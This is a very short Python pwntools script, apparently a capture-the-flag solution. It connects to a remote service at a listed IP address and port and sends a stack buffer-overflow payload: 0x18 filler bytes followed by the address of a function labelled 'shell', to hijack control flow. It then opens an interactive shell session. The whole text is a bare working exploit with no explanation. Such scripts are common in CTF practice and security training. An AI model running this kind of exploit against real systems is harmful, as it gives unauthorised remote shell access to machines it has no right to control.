from pwn import *

shell = 0x4005B6
io = remote('1.14.71.254','28165')
io.sendline(b'a'*0x18+p64(shell))

io.interactive()